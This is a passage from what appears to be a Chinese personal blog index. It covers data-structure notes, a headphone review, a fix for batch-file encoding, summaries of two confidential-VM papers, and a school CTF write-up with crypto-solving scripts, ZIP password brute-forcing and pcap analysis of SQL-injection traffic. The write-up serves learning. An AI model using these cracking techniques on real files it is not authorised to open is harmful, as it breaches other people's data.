树的每个节点可以存储更多的关键字，因此在内存占用方面更加优秀。\n\n介绍一下单例设计模式单例设计模式是一种创建型设计模式，它保证一个类只有一个实例，并提供了一个全局访问该实例的入口。\n在单例设计模式中，类的构造函数被私有化，以防止外部直接通过构造函数创建多个实例。同时，该类提供一个静态方法用于获取该类唯一的实例。在该方法中，会先判断是否已经存在该实例，如果已经存在则直接返回该实例，如果不存在则创建一个新实例并返回。\n单例模式主要用于控制实例的数量，避免不必要的内存占用和对象创建。它可以提供一个全局的访问点，方便其他模块或类访问该实例。在多线程环境下，需要注意线程安全，可以通过加锁或双重检查等方式来保证线程安全。\n需要注意的是，单例模式虽然有很多优点，但是也存在一些缺点。例如，单例模式会增加代码的复杂度和可读性，同时也会增加测试的难度。因此，应该在确实需要控制实例数量时才使用单例模式。\n介绍一下 B 树和 B+ 树B 树和 B+ 树都是一种多路平衡查找树，主要用于在磁盘等外存储介质上进行数据的高效组织和访问。\nB 树是一种平衡树，每个节点可以有多个子节点，通常用于数据库索引等场景。B 树的每个节点中存储的数据是该节点所有子节点中最大或最小的值。在查找时，从根节点开始，依次查找满足条件的子节点，直到找到目标数据或到达叶子节点。\nB+ 树是在 B 树的基础上进行改进的，相对于 B 树，B+ 树的所有数据都存储在叶子节点上。每个节点中只存储关键字，而不存储数据，数据只存储在叶子节点上，从而可以减少非叶子节点的磁盘 I/O 次数。在 B+ 树中，叶子节点之间有一个双向链表连接，可以方便地进行范围查询操作。同时，B+ 树的内部节点可以存储更多的关键字，相对于 B 树可以更好地利用磁盘块的大小，从而提高查询效率。\n总体来说，B 树和 B+ 树都是一种非常重要的数据结构，它们可以很好地解决在磁盘等外存储介质上进行数据组织和访问的问题。在实际应用中，需要根据具体场景选择适合的树型结构。\n","categories":["计算机基础"],"tags":["经验","计算机基础"]},{"title":"自用耳机盘点","url":"/2024/03/12/%E8%87%AA%E7%94%A8%E8%80%B3%E6%9C%BA%E7%9B%98%E7%82%B9/","content":"最近几个月看了不少耳机相关的内容，初步了解了一些耳机的参数指标以及选购方案，同时也给自己使用的耳机进行了一波更新换代。本文就简单盘点一下自己之前用过的和现在正在使用的耳机，内容完全基于个人的使用体验。\n已退役赛睿 Arctis9x\n主要是为了无线连接 xbox 而购入。买之前看了不少网上的评价，包括视频评测以及 RTINGS 网站上的测试，感觉很不错，但是这耳机并没有国行版本，而且海外版售价高达 200 美元，对我而言实在是太贵，就在淘宝花 398 购入了一副所谓的“9成新”的“洋垃圾”。\n单就产品本身的素质来说，我觉得还是很不错的。尽管作为游戏耳机，但它的音乐表现依然非常出色，三频的表现十分均衡。参考 RTINGS 网站上对于 9x 的评测，其中 Neutral Sound 项评分高达 7.8 分并给出了 “satisfactory” 的评价。麦克风质量也相当不错，这根可伸缩的麦克风虽小，但却拥有优秀的收音质量和降噪能力，不过我也只是拿到手的时候测试了一下，并没有怎么使用。佩戴方面，耳机头梁采用了松紧带的设计，使得佩戴时不至于压头。耳罩不算很透气，夏天佩戴可能会比较热，但好在相对柔软，网上普遍说赛睿 arctis  系列这套模具比较夹头，我感觉也稍微有点，但在可接受的范围之内。总之，作为游戏耳机，我对 9x 的表现还是相当满意的。\n但由于是二手产品，电池不可避免的有一定程度的损耗，我这副看上去损耗还比较大，官方标称的 20 小时续航，我实际使用大概只能撑六七个小时。另外，使用了不到一年之后，连接耳机头梁和发声单元的转轴就出现了松动的情况，最开始也没怎么在意，但结果是越用越松，直到耳机已经无法稳固佩戴，晃动耳机还能听到断裂的塑料碎片的声音，应该是转轴内部物理结构的损坏。上网上一看，原来是比较普遍的现象，就挺无语的。尝试在淘宝找耳机维修，发现价格还挺贵的，想想还是算了，只能无奈将其退役了。\nXbox 官方有线头戴\n9x 退役之后，就想着找一个接替它的游戏头戴，在使用 9x 的过程中，我发现无线对我而言好像并不是那么重要，而且无线耳机还得时刻关注电量，以及考虑长期使用后电池损耗的问题，因此我这次主要把目光放在了有线头戴上。\n在雷蛇噬魂鲨有线和 Xbox 官方有线的纠结中，我最终还是选择了后者。现在想想，主要原因可能还是因为 Xbox 的外观设计更合我意以及期待官方配件的玄学加成（？？）。旋钮式音量调节、可弯曲收纳的麦克风以及 Xbox 标志性的绿色线材共同构成了这副耳机极简主义的设计。至少在外观部分，我还是比较喜欢的。\n但耳机的实际使用体验不能说糟糕，却也很难让人满意。佩戴方面，耳罩是蛋白皮材质，触感还算 ok，也不夹头，但可能正因为不夹头，耳机的佩戴牢固性主要依靠压在头上的头梁来提供，佩戴时间稍长头部就会有很明显的不适感，因此佩戴方面的体验是很不理想的。音质表现也是完全没有达到要求，无论是风格还是素质都和之前使用的 9x 有比较明显的差距。调音风格上，9x 整体是偏向中高频的，听上去会比较亮，而 Xbox 有线则是偏向于中低频，声音非常的沉闷，刚拿到手听的时候就感觉非常不适应，与我的听音偏好很不匹配。素质上来说，9x 基本是完爆 Xbox 有线，毕竟二者其实本就不是一个价位段的产品，无论是解析力还是声场，前者相比后者都有非常明显的优势。之前我有对比过在游戏《荒野大镖客1》中同一个场景二者的声音表现，结果就是能够在 9x 中听到的一些非常微弱、具有方向感的环境声在 Xbox 有线中与游戏的场景音乐混作一团，丢失了大量细节。\n最终，还是决定挂闲鱼出掉了。\n原道系列由于本人晚上睡觉时有收听电台的习惯，因此一副价格便宜、纯听个响的功能性耳机很有必要。因此号称听了触发“悔恨之泪”的原道就成为了我的首选。\n原道系列这几年我也陆陆续续买了好多副了，包括最早散装的原道无迹，以及后来二次元封面的原道酱。最早的散装版本现在仍然在售，不过个人不太推荐，主要原因是线材质量不太行，我有好几副都是用了几个月之后出现了线材老化的情况，然后随之而来的就是耳机只有一边出声，不得不进行更换。后面出的原道酱在线材质量上有很大提升，我手里这条铜线版本用了一年多依然正常。不过作为我睡觉时佩戴的耳机，佩戴舒适度必然也要考虑其中，原道的这款平头塞采用了与经典的森海塞尔 mx500 相同的模具，声学结构设计上就很优秀，可能这也是原道在如此低的价位具备还不错的声音表现的重要原因，但是其在佩戴舒适度方面实在一般，耳机腔体不算小，长时间佩戴的情况下能感觉到由于塑料腔体与耳道硬接触而产生的硌痛感，戴上海绵套能相对缓解，但海绵套又很容易松动，时不时就会脱落，比较麻烦。\n后来也有尝试过他家的 x39 微动圈，但是佩戴实在不牢固，稍微翻个身可能就掉了，另外入耳式也不适合长时间佩戴，容易出现中耳炎的症状，因此最终放弃。\n现役飞利浦 SHP9500\n由于个人打游戏还是比较习惯头戴式耳机，因此在上述两幅头戴都退役之后就想着找一副音质出色、佩戴舒适的替代品。在各大论坛和评论区逛了一段时间，发现了一个反复被提到的名字：飞利浦 SHP9500，同时了解到这是一副开放式头戴，由于我之前并没有听过开放式头戴耳机的声音，对此比较好奇，加上价格也不算高，因此我也没有过多犹豫，就在闲鱼花 170 多淘了一副成色很不错的。\n到手试听了一下，发现与此前听过的封闭式头戴的感受截然不同，声音非常通透干净，声场极其开阔，用通俗的语言来形容就是你能感受到各种乐器的声音分布在你耳朵的不同方位，临场感十足。这样开阔的声场也非常适合游玩大型 3A 游戏，能够很大程度上增加代入感。但是开放式也有很大的局限性，就是糟糕的隔音性能以及严重的漏音问题，这也意味着这类耳机的基本只能在比较私人的空间和场合使用，比较遗憾。\n另一个令人印象深刻的点便是它的佩戴体验，个人使用过的头戴耳机不多，9500 绝对是其中佩戴最为舒适的无之一。耳机的可调节范围很大，加上透气且足够大的耳罩，使得大部分人都能通过简单调整获得一个比较舒适的佩戴感受，既不夹头也不压头，连续佩戴数个小时也不会感到疲劳。\n最后要吐槽的一点就是原装线材虽然质感不错，但实在是太长了，足足有 3 米，我在使用了一段时间后还是嫌麻烦，自己买了一根飞利浦的 1.5 米编制线材，做工还算不错，与 9500 搭配也比较合适。\n水月雨 兰\n其实单论音质，9500 已经完全能够满足我的需求了，但是毕竟是开放式头戴，使用场景非常有限，就想着再入一副音质出色、方便携带、能够让我出门在外享受音乐的耳塞式耳机。作为我的候选产品的有 Nicehck DB2、兴戈 EW200、水月雨 竹2，以及我最终选择了的水月雨 兰，原因无外乎两点：平直中正的调音和优雅的外观。\n首先是音质，购买前看网上评价说兰整体的调音取向是偏监听向的，低频不够有力，但个人平时听 ACG 音乐多一些，主要偏向于中高频，因此调音方面还算比较符合我的听音取向。拿到手后果然如此，并且解析力很强，不同乐器之间的分离度做得非常好，除了物理结构所限的声场外，整体听感已经很接近 9500 了，足以胜任个人的便携音乐耳机。\n促使我选择兰的一个另外一个很重要的原因便是它的外观，当时在产品介绍页面第一眼看到便喜欢上了。不仅在于耳机腔体极简风格的设计，更在于原装线材与其共同搭配所表现出的一体性。线材的颜色本就与耳机本体风格很搭，还在分线处和插头部分使用了粉末冶金工艺，并配上兰标志性的 logo，进一步增强了耳机的质感，整体外观非常符合我的审美。\n苹果 Earpods\n个人现役的功能性耳机，也是我现在日常使用最多的耳机。\n作为功能性耳机，佩戴舒适度必然是首先需要考虑的问题，earpods 在这方面可谓是相当优秀。轻盈的重量、贴耳的腔体以及光滑的材质共同造就了近乎无感的佩戴体验，以至于直到今天仍然有相当多的厂商模仿 earpods 的外观设计，可以说以一己之力开辟了半入耳式这个全新的赛道。\n虽说个人主要把它当作功能性耳机来使用，但这并不意味着 earpods 的声音表现不行，相反，它的三频表现足够均衡，足以满足个人的大多数的影音需求。另外得益于开放式的设计，earpods 作为一副耳塞式耳机，拥有比其他封闭耳塞式耳机更加开阔的声场，整体的听感也更通透。\n另外虽然个人使用的不多，但 earpods 这个不起眼的线控麦克风也值得一说。这个麦克风虽小，但却拥有相当不错的收音质量，参考 RTINGS 上的评分，earpods 的 Recording Quality 项高达 8.1 分，这个成绩已经达到了很多游戏耳机的水平，足以应付语音通话和线上会议的需求，缺点就是噪音抑制一般，需要在尽量安静的环境中使用。\n官方 149 元的售价肯定称不上足够便宜以至于当消耗品来使用，但由于这款耳机已经发售多年，并且质量足够出色，以至于在二手市场上的保有量非常可观，基本上 50 ~ 60 元的价格就能淘到一副成色很不错的。因此只要能够接受二手，earpods 还是一个相当具有性价比的选择。\n红米 Airdots3pro\n红米的这副 TWS 还是 21 年的时候买的，但是个人使用的其实并不多。\n耳机的质感还算比较出色，佩戴体验也很不错，比较牢固且舒适。声音表现放现在来看是比较糟糕的，整体的听感比较闷，即使切换到高音增强模式也没有太大改善，当然也可能与个人的听音喜好有关，总之对我而言，拿它来听音乐并不是一个好的选择。但毕竟是注重便携的 TWS，音质方面我也没有抱太高的期望，主要还是使用体验方面的问题。首先便是续航，我这副尽管使用并不频繁，但单次续航大概只有 3 ~ 4 个小时了，如果全程开启降噪或通透模式的话肯定会更低，加上充电仓后的总续航时间个人没有统计过，不过应该也不会太乐观。此外，不知道是什么原因，我总感觉在开启降噪模式后时不时会出现左右耳压不一致的情况，不知道是不是软件 bug，总之相当影响体验。最后就是耳机麦克风貌似只支持通话时调用，其他应用无法调用，因此诸如微信视频通话和录音等场合只能使用手机自带麦克风，原因不明。\n虽说 airdots3pro 的使用体验放今天来看并不理想，但我目前并没有打算更换，毕竟我现在还是更习惯有线耳机即插即用、不用担心电量问题的省心感。\n","categories":["数码"],"tags":["闲谈","经验","数码"]},{"title":"让批处理文件中的中文正常显示","url":"/2021/05/11/%E8%AE%A9%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E4%B8%AD%E6%96%87%E6%AD%A3%E5%B8%B8%E6%98%BE%E7%A4%BA/","content":"最近在学习DOS命令和批处理相关内容的时候，遇到了点问题，就是在执行包含中文的批处理文件时，中文无法正常显示，在查阅了相关资料之后，了解了一些编码相关的内容。\n\n\n原因编码相关的那些事现在主要的两种编码格式为UTF-8和ANSI。\n\nANSI是一种字符代码，为使计算机支持更多语言，通常使用 0x00~0x7f 范围的1 个字节来表示 1 个英文字符。超出此范围的使用0x80~0xffff来编码，即扩展的ASCII编码。\n\n为了应对不同国家和地区的使用，ANSI编码存在很多不同的标准：由于汉字的种类非常多，而一个字节（Byte）最多只能表示2^8 = 256种文字与符号，这肯定是远远不够的。因此在中国、日本、韩国等采用象形字符的地区，通常采用双字节字符集的方式来表示文字符号，即采用两个字节来表示一个字符。在简体中文系统下采用的是GBK标准，比如汉字“字”就使用[0xd7,0xd6]两个字节进行存储。系统会根据计算机语言来确定ANSI的标准，当然也可用手动更改。\n\nUTF-8（8位元，Universal Character Set/Unicode Transformation Format）是针对Unicode的一种可变长度字符编码。它可以用来表示Unicode标准中的任何字符，而且其编码中的第一个字节仍与ASCII相容，使得原来处理ASCII字符的软件无须或只进行少部分修改后，便可继续使用。因此，它逐渐成为电子邮件、网页及其他存储或传送文字的应用中，优先采用的编码。\n\nUTF-8相较于ANSI最大的特点就是采用了可变长度的编码方式，相较于ANSI对任何字符都采用固定长度编码，UTF-8可对不同范围内的字符使用不同长度的编码，比如英文中一个字符就用一个字节表示，而汉语则使用三个字节，使得不同的文字都可以以一套通用的标准进行编码，这保证了不同语言的系统中编码的通用性。\n产生原因查看文本编辑器的编码格式，发现采用的是UTF-8的编码格式，但是win10系统控制台的默认编码格式为ANSI编码，与文本编码格式不符合，导致计算机用ANSI的标准去对采用了UTF-8编码的文本进行解释，结果自然就产生了乱码。\n\n解决解决方法可以将文本的编码格式改为与控制台编码一致，这里建议都改为ANSI编码，因为UTF-8编码格式下的控制台的提示信息为英文。这里在更改了文件的编码格式为ANSI并重新编辑文本后，中文显示正常。\n\n当然如果你想保证指令的通用性，批处理文件仍要采用UTF-8的编码格式，可以选择更改控制台的编码格式，以下给出了两种将控制台编码格式更改为UTF-8的方法。\n方法1：注册表编辑器修改Step1：打开注册表编辑器可以直接在Win10搜索框中搜索关键字“注册表”打开，也可以Win+R运行“Regedit”。\nStep2：找到相应的数据并更改找到 HKEY_CURRENT_USER\\Console\\%SystemRoot%_system32_cmd.exe 并将其更改为65001（十进制）或fde9（十六进制）。\n\n方法2：运行注册表脚本可以直接将方法1的操作编写为一个脚本操作，代码如下：\nWindows Registry Editor Version 5.00[HKEY_CURRENT_USER\\Console\\%SystemRoot%_system32_cmd.exe]&quot;CodePage&quot;=dword:0000fde9\n复制到新建文本文件并将拓展名改为“.reg”，运行。\n","categories":["经验"],"tags":["经验","编码格式","批处理","Windows10","注册表"]},{"title":"记一次CTF校赛","url":"/2021/12/04/%E8%AE%B0%E4%B8%80%E6%AC%A1CTF%E6%A0%A1%E8%B5%9B/","content":"本文记录一下刚刚结束的CTF校赛，感觉本次校赛题目出得实在有点坑，但也算学到了不少东西。\nCryptoeasy_ECC问题描述已知椭圆曲线加密Ep(a,b)参数为p = 15424654874903a = 305423748b = 315284355172G(15079176652031,83237376468)私钥为k = 655321求公钥K(x,y)\n思路常规的椭圆曲线加密问题，直接根据加密原理编写解密程序，得到两个结果。根据问题提示，考虑 flag 为两数的异或结果。\n解密脚本def add(A, B):    if A == (0, 0):        return B    if B == (0, 0):        return A    x1, y1 = A    x2, y2 = B    if A != B:        λ = (y2 - y1) * pow((x2 - x1), p - 2, p)    else:        λ = (x1 * x1 * 3 + a) * pow(2 * y1, p - 2, p)    x3 = λ * λ - x1 - x2    y3 = λ * (x1 - x3) - y1    return (x3 % p, y3 % p)if __name__ == &#x27;__main__&#x27;:    p = 15424654874903    a = 305423748    b = 315284355172    G = (15079176652031, 83237376468)    k = 655321    C = (0, 0)    for i in range(k):        C = add(C, G)    print(C)    print(C[0] ^ C[1])\n心得本题没有什么特别之处，就是标准的椭圆曲线加密问题的求解，重点在于理解椭圆曲线加密的原理。\nRead_the_Message问题描述# python 3.7import base64from urllib.parse import quotedef main(key = &quot;init_key&quot;, message = &quot;init_message&quot;):    s_box = init_sbox(key)    crypt = str(excrypt(message, s_box))    return  cryptdef init_sbox(key):    s_box = list(range(256))    j = 0    for i in range(256):        j = (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] = s_box[j], s_box[i]    return s_boxdef excrypt(plain, box):    res = []    i = j = 0    for s in plain:        i = (i + 1) % 256        j = (j + box[i]) % 256        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % 256        k = box[t]        res.append(chr(ord(s) ^ k))    cipher = &quot;&quot;.join(res)    print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))    return (str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))# main(&quot;jnsec&quot;,&quot;xxxxxxxxxxxx&quot;)# ciphertext = w7okesOpwr0YYEtYwqYPSQ==# key = jnsec# flag = JNCTF&#123;xxxxxxxxxxxx&#125;# Try to decrypt it !\n思路题目给出了加密程序以及密文，则将加密程序反写得到解密程序，并将密文作为输入，得到 flag 值。\n解密脚本import base64def init_sbox(key):    s_box = list(range(256))    j = 0    for i in range(256):        j = (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] = s_box[j], s_box[i]    return s_boxdef decrypt(cipher, box):    res = []    i = j = 0    cipher = base64.b64decode(cipher).decode()    for s in cipher:        i = (i + 1) % 256        j = (j + box[i]) % 256        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % 256        k = box[t]        res.append(chr(ord(s) ^ k))    for r in res:        print(r, end=&#x27;&#x27;)if __name__ == &#x27;__main__&#x27;:    ciphertext = &quot;w7okesOpwr0YYEtYwqYPSQ==&quot;    key = &quot;jnsec&quot;    box = init_sbox(key)    decrypt(ciphertext, box)\n心得本题重点在于程序的正确反写，即先 base64 解密，再单独对每个字符进行处理，需要注意的是异或（^）反写仍然是异或。\nbaby_rsa问题描述# baby_rsac = 10037709916698055005402119185691833127096330074819596592018139982119855547820n = 73069886771625642807435783661014062604264768481735145873508846925735521695159e = 65537\n思路给出了 RSA 加密的c（密文）、n、e，则考虑先将 n 大数分解得到 p 和 q，再根据 RSA 加密的原理求解 d，并根据解密公式求解明文 m，最后将 m 转换成 bytes 格式，得到 flag值。\n解密脚本from Crypto.Util.number import long_to_bytesn = 73069886771625642807435783661014062604264768481735145873508846925735521695159p = 189239861511125143212536989589123569301q = 386123125371923651191219869811293586459c = 10037709916698055005402119185691833127096330074819596592018139982119855547820e = 65537phi_n = (p - 1) * (q - 1)k = 0while True:    if (k * phi_n + 1) % e == 0:        d = (k * phi_n + 1) // e        break    k += 1print(&quot;d值为：&quot;, d)m = pow(c, d, n)print(&quot;m值为：&quot;, m)print(long_to_bytes(m))\n心得本题我最后没有求解成功，按理说就是很常规的 RSA 加密求解，但是本题出的很坑的一点在于题目并没有说明最后需要对明文 m 进行 long_to_bytes() 的处理，这很容易让解题者误以为是明文求解错误。不过另一方面也反映了我对于将整型数据转换成字节数据这一知识点的缺失。\nMISCeasy_disk问题描述题目给出了一个名为 bomb.img 的磁盘文件，查找 flag 值。\n思路dishgenius 打开虚拟磁盘文件 bomb.img，打开后点击右边窗口的“浏览文 件”，发现三个0字节的空文件，点击软件上面的“恢复文件”，得到一个 ZIP 压缩包和一个 txt 文件。\ntxt 文件提示为“C4炸弹”，百度可知CS系列游戏中的 C4 炸弹密码为7355608， 解压后得到一个二维码，但二维码三个定位点均被抹去，利用ps等软件恢复二 维码后，扫描二维码得到flag。\n心得本题我倒是没有按照正规解法——分析磁盘文件来解决。在看到磁盘文件时，我第一时间想到使用 foremost 文件将其分离，只得到一个 ZIP 压缩包，随后根据题目描述的 bomb 等信息考虑到暴力破解该压缩包，最终也成功将压缩包解压。但是如果密码相对复杂那么暴力破解可能不会成功，因此了解各种文件类型的分析方法是至关重要的。\n\nbig_shark问题描述题目给出一个 pcapng 格式的数据包文件，查找 flag 值。\n思路以 wireshark 为例，打开流量包，筛选 HTTP 协议，发现成堆的 sql 注入攻击流量，进一步简单筛选带有关键词的 http 协议流量 http contains “select” 。\n按时间顺序记录下攻击语句中的 ascii 值，解码后拼接在一起发现是一串字符且以 = 结尾，判断为 base64 编码，因此再 base64 解码，得到flag。\n解密脚本import base64dic = [83, 107, 53, 68, 86, 69, 90, 55, 85, 51, 70, 115, 97, 86, 57, 74, 77, 49, 57, 84, 77, 70, 57, 74, 98, 110, 82,       108, 99, 106, 82, 122, 100, 68, 70, 117, 90, 51, 48, 61]m = &quot;&quot;for e in dic:    m += chr(e)print(m)print(base64.b64decode(m).decode())\n心得我虽然对计算机网络的知识几乎几无所知，也不清楚 pcapng 是什么文件类型，但还是在查阅网络资料的情况下，按照网上已有的样例，按部就班的得到了相应的 ascii 码并最终将其解码，可见用好搜索引擎的重要性(doge)。\nmagic_photo问题描述题目给了一张 jpg 格式图片，查找 flag 值。\n思路使用 010Editor 打开图片，发现16进制编码中有Unicode以及坐标。\n\n将 unicode 转换成字符，得到一串 emoji 字符，根据提示进行 emoji-aes 在线解密：emoji-aes.\n\n根据图二坐标绘制点阵图，得到 emoji-aes 解密密钥。\n\n最后进行在线解密，得到 flag 值。\n心得本题我认为出的是非常坑了，我首先用 foremost 将图片分离得到 ZIP 压缩包和一个提示的文本文件，文本提示“你了解这位小姐姐嘛？”，猜测为图片中人物的某些信息。\n故使用百度识图得到图片人物为吉克隽逸，最终得到压缩包密码为她的生日 19880513。\n解压后得到一个音频文件，为她演唱的一首歌，在歌的末尾含有一串摩尔斯电码，观察该音频文件的波形图并记录下摩尔斯电码并解密，得到JNCTFDOY0UTH1NKYOUARERI9HT?，显然，这是一个虚假的 flag。\n个人认为，坑不是不能有，但得到这样错误结果的代价也是不小的，且正确解法与错误解法之间完全没有任何联系，希望出题人能平衡好这其中的差别。\n","categories":["经验"],"tags":["CTF","Crypto","信息安全"]},{"title":"论文《Cabin：Confining Untrusted Programs within Confidential VMs》总结","url":"/2025/07/19/%E8%AE%BA%E6%96%87%E3%80%8ACabin%EF%BC%9AConfining%20Untrusted%20Programs%20within%20Confidential%20VMs%E3%80%8B%E6%80%BB%E7%BB%93/","content":"本文将介绍 2024 年发表在 arXiv 上的论文《Cabin: Confining Untrusted Programs within Confidential VMs》。\n\n解决的问题特权级划分保证系统稳定运行的最基本机制，然而传统的特权级划分存在一些不足之处：首先，由于内核庞大的代码所带来的庞大的攻击面，用户态和内核态的接口——系统调用可能会被恶意用户程序利用以绕过内核的保护机制；其次，MMU 缺乏细粒度的页面保护，x86 架构下页表项的读写权限仅由一个 R/W 位来指示，只能被配置为只读或可读可写，限制了 XOM（eXecute-Only Memory）的高效实现。\n具体来说，本文工作的威胁模型基本继承自 CVM 的威胁模型，在此基础上加入了对于部分应用程序的不信任，认为其可能包含内存安全错误。贡献如下：\n\n设计并实现了一个 CVM 内的安全进程执行框架，借助 VPML 机制，保护 guest OS 免受不可信程序的威胁。\n引入系统调用异步转发、自管理内存等机制降低框架带来的性能开销，根据在 Nbench、WolfSSL 等基准测试下的性能表现，表明本框架的性能开销较低。\n\n设计与实现系统设计Cabin 的架构如下图所示：\n\n为了将 guest OS 与不可信应用程序隔离开来，Cabin 将其运行在更低特权的 VMPL 下。同时又为了方便管理这些受限进程（confined process），引入了代理内核（proxy kernel）的概念，扮演受限进程和 guest OS 之间中介的角色，对系统调用、中断等进行管理。\nCabin 框架主要包含四个组件：受限线程的生命周期管理、上下文切换、系统调用路由、异常模型。\n生命周期管理Cabin 对运行在低 VMPL 的线程管理分为三个阶段：创建、进入和退出。首先为低 VMPL 准备运行时环境，并分别为每个线程分配 VMPL 并将状态同步到相应的 VMSA 中。然后，通过请求 hypervisor 在特定 VMPL 下执行，当前 CPU 直接切换到相应 VMPL 的执行流中。首先是代理内核，代理内核完成一些系统调用处理、中断处理等的初始化之后，便将执行流切换到应用程序，等待来自用户态的系统调用或中断，代理内核根据其类别，选择自己处理或者转发到 guest OS 来处理。guest OS 一直处于等待请求的循环中，直到收到 exit 或 exit_group 系统调用，此时结束对该低 VMPL 的调度，并回收其资源。\n上下文切换受限进程的上下文切换工作仍然由 guest OS 来完成，只是多了一个状态同步的过程：在进行上下文切换时，将低 VMPL 的 VMSA 结构数据与 guest OS 所管理的 TCB（Linux 下为 task_struct）状态进行同步。\n系统调用路由对于受限进程，发起系统调用时，首先陷入到代理内核的处理函数中，对于一些系统调用，可以直接在代理内核中处理并返回。对于代理内核无法处理的系统调用，将会通过切换 VMPL 的方式进行转发。具体的转发处理方式是：在切换 VMPL 时，低 VMPL 的系统调用参数会自动被保存到其 VMSA 结构中，guest OS 可以直接对其进行访问，并在处理完成后将结果直接存放在 VMSA 中。\n\n 这一过程所依赖的核心机制是：在 CVM 内，高 VMPL 可以直接访问低 VMPL 的 VMSA 状态，反之则不行。\n\n异常模型异常处理与系统调用类似，代理内核能自行处理便直接处理，否则转发到 guest OS 中来处理。\n性能优化异步转发基于共享内存和自旋锁的线程间通信。初始化阶段，Cabin 初始化一个服务线程一直等待请求，代理内核可以利用共享内存将系统调用和中断请求转发给服务线程，由服务线程再进行转发，代理内核继续执行其他操作？\n\n原文：During the initialization stage, Cabin initiates a service thread that waits for requests using a spinlock. Upon entering the lower VMPL, the proxy-kernel of the lower VMPL can utilize this interface to forward syscalls and interrupts to the service thread. Once the request is completed, the proxykernel returns the result to the confined process, which then resumes execution until the next syscall or interrupt occurs.\n\n自管理内存guest OS 直接将一部分物理页面授权给代理内核，直接由其处理一些与虚拟内存相关的系统调用和异常等。当需要时，代理内核从 guest OS 请求额外的内存页面。\n","categories":["操作系统"],"tags":["操作系统","虚拟化","机密计算"]},{"title":"论文《Ditto：Elastic Confidential VMs with Secure and Dynamic CPU Scaling》总结","url":"/2025/07/10/%E8%AE%BA%E6%96%87%E3%80%8ADitto%EF%BC%9AElastic%20Confidential%20VMs%20with%20Secure%20and%20Dynamic%20CPU%20Scaling%E3%80%8B%E6%80%BB%E7%BB%93/","content":"本文将介绍 2024 年发表在 arXiv 上的论文《DITTO：Elastic Confidential VMs with Secure and Dynamic CPU Scaling》。\n\n解决的问题机密虚拟机（CVM）在带来了强大的机密性和完整性保护的同时，也带来了很多限制，导致虚拟机的性能和灵活性的下降。例如：不支持 vCPU 的热插拔（即运行中动态调整 vCPU 的数量），该特性可以用于在虚拟机运行过程中灵活调整计算能力，应用于 Serverless 等计算环境下。\n\n虽然的商用 CVM 方案还没有任何一家支持 vCPU 热插拔，但是内存的动态调整是可行的。例如 AMD SEV-SNP 下 hypervisor 可以使用 RMPUPDATE 指令将 CVM 的内存进行回收和动态分配。\n\n由于缺少了 vCPU 数量的动态调整能力，现有的机密无服务器环境（OpenWhisk + Kubernetes + 机密容器）要想动态调整运算能力，只能借助于启动新的 CVM，这会带来很大的性能开销。本文提出了“弹性 CVM” 和 “Woker vCPU” 的概念，能够在 CVM 环境下动态调整参与计算的 vCPU 数量。具体来说，本文的主要贡献如下：\n\n弹性 CVM 的概念： 利用 CVM 和 hypervisor 的协同来动态调整 CPU 资源的分配，增强 CVM 的效率。\n创新的 Worker vCPU 设计： Worker vCPU 是一种特殊的 vCPU，通过与 hypervisor 协同的方式被调度，能够随着工作负载的变化而在休眠和工作状态间转变。\nWorker vCPU 抽象层： 用于简化对 Worker vCPU 的操作。\nDitto 原型开发和实验评估： Ditto 是使用了 Worker vCPU 设计的机密 Serverless 平台，能够实现安全且自动扩展的 Serverless 环境。实验评估表明 Ditto 在资源利用上相较于现有的机密 Serverless 平台有显著提升。\n\n设计与实现Worker vCPUWoker vCPU 的架构图如下所示：\n\nWorker vCPU 的状态分为活跃和休眠，设计目标是根据系统负载的变化而动态改变 Woker vCPU 的状态。\n为了实现的简单和减少 CVM 内 TCB（可信计算基） 的大小，作者选择将对 Worker vCPU 的调度策略放在了 hypervisor 中，而不是由 CVM 内部来决定。而 hypervisor 对 CVM 内部执行情况的了解是很有限的，因此 Worker vCPU 的调度需要 CVM 与 hypervisor 在不损害安全性的前提下完成，且适用的场景没有那么广。主要适用场景为：事件驱动系统和生产者-消费者模型（无状态和松耦合线程），例如 HTTP 请求的发送和处理、数据库查询的请求和处理。这些请求的处理相对独立，能够动态调整计算资源。\n初始化 CVM 时，需要指定普通的 vCPU 数量 $m$ 和最大的 Woker vCPU 数量 $n$ ，Woker vCPU 在 CPU 硬件看来与 vCPU 无异，但是为了实现动态运行时调整，CVM 内核和 hypervisor 都必须能够对此进行区分。例如，可以将 $vCPU[1, m]$ 看作是普通 vCPU， $vCPU[m + 1, m + n]$ 看作是 Woker vCPU，CVM 在启动应用时将特定的工作线程绑定到特定的 Woker vCPU 上。\n由于 CVM 下虚拟机内部的运行状态对 hypervisor 来说是不可见的（SEV 的内存加密和 SEV-ES 的寄存器状态加密），因此 CVM 与 hypervisor 的协同很重要。例如：Worker vCPU 可以在执行完一个任务后，主动向 hypervisor 发送 “check-in” 的信号，表明一个任务已完成，hypervisor 受到信号后便可以决定要不要将 Worker vCPU 置为休眠状态。之所以需要这样的协同，是为了防止 hypervisor 在一个任务执行中途将 Worker vCPU 置为休眠，导致任务执行被推迟。\nDittoDitto 的架构图如下所示：\n\nDitto 相较于传统的 Kata 容器的部署过程，存在下列主要不同：\n\n启动 CVM： 以 $m$ 个普通 vCPU 和 $n$ 个 Worker vCPU 进行初始化。\nWorker vCPU 注册： 应用启动时需要将特定的线程注册到 Worker vCPU 上，且保持不变，同时还不允许其运行内核函数，因此 Worker vCPU 可以被安全的启用和睡眠，不会影响整体系统的正常工作，只会影响效率。\n\nWorker vCPU 调度调度器依赖于两个方面： 观察指标和调度算法 。\n在 CVM 环境下，hypervisor 的观察指标很有限。在 Ditto 中，作者主要基于 Linux 内核数据结构 task_struct 的时间信息来计算一个采样周期内 vCPU 运行的时间来计算工作负载量。\n\n这里信息的获取方式不太明白。\n\n其他一些可能的指标还有：HTTP 请求的数量、每个请求的近似处理时间等。\n调度算法方面，作者采用了一个简单的策略：当活跃的 vCPU 的总负载达到一个预先设定的阈值后，就唤醒一个 Worker vCPU，活跃的 vCPU 的总负载降低过一个预先设定的阈值后，就睡眠一个 Worker vCPU。注意如前文所述，需要在接收到 